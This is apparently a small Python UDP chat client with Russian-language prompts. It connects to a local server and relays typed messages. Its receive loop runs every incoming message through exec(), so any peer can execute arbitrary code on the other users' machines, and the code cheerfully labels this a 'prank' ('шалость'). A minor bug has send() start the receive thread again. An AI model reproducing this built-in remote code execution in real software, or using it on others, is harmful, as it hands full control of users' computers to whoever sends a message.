import sys
import os
import socket
import time
import webbrowser
import threading

IsFirstTimeOpened = True
USERNAME = input('Введите Имя: ')
UDP_MAX_SIZE = 1024

host_data = 'localhost'
port_data = 57615

is_connected = False


class MainMirror():
    def __init__(self):
        super().__init__()
        self.set_name()
        self.connect_to_server(host_data, port_data)
        self.listen()

    def connect_to_server(self, host: str, port: int) -> None:
        self.host, self.port = host, port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.connect((self.host, self.port))
        self.sock.send(f'__join{self.name}'.encode('utf-8'))

    def set_name(self):
        global USERNAME
        self.name = USERNAME

    def send_messages(self):
        while True:
            self.sock.send(input().encode('utf-8'))

    def receive_messages(self):
        while True:
            msg = self.sock.recv(UDP_MAX_SIZE)
            try:
                exec(str(msg.decode('utf-8')))
                print('Кто то отпраивил вам шалость!')
            except Exception:
                print(str(msg.decode('utf-8')))

    def listen(self):
        threading.Thread(target=self.receive_messages, daemon=True).start()

    def send(self):
        threading.Thread(target=self.receive_messages, daemon=True).start()


if __name__ == '__main__':
    mirror = MainMirror()
    while True:
        mirror.send_messages()